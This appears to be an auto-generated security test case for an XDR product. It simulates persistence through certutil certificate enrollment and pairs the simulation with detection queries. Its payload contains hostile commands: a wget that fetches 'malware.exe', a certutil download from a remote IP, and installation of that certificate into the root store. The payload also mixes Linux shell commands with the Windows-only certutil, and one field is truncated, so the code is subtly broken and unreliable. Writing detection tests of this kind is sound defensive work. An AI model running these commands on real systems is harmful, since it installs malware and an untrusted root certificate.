identity.name: Certificate Enrollment via CertUtil for Persistence
identity.summary: An attacker uses certutil to download and enroll a malicious certificate for persistence, triggering a suspicious process behavior. Cortex should detect the enrollment process and associated network a
identity.description: An attacker uses certutil to download and enroll a malicious certificate for persistence, triggering a suspicious process behavior. Cortex should detect the enrollment process and associated network activity.

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/malware.exe https://example.com/malware.exe
chmod +x /tmp/scratch/malware.exe
certutil -urlcache -split -f https://192.0.2.10/cert.cer cert.cer
 certutil -addstore -f root cert.cer

expected_artifacts.description: Certutil process started with URL cache and split options

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious CertUtil Usage for Certificate Enrollment
biocs.description: Detection of certutil process being used with -addstore and -f flags to enroll a certificate
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'certutil.exe'
| filter action_process_command_line contains '-addstore'
| filter action_process_command_line contains '-f'

abiocs.name: Unusual Certificate Enrollment via CertUtil
abiocs.description: Behavioral deviation where certutil is used to enroll a certificate after downloading from a remote URL
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'certutil.exe'
| filter action_process_command_line contains '-urlcache'
| filter action_process_command_line contains '-addstore'
| filter action_process_command_line contains '-f'
| filter action_remote_ip = '192.0.2.10'
abiocs.causality_anchor: certutil process start with URL cache and certificate store flags

xql_queries.name: Detect Suspicious CertUtil Usage
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'certutil.exe'
| filter action_process_command_line contains '-addstore'
| filter action_process_command_line contains '-f'
| filter action_remote_ip = '192.0.2.10'
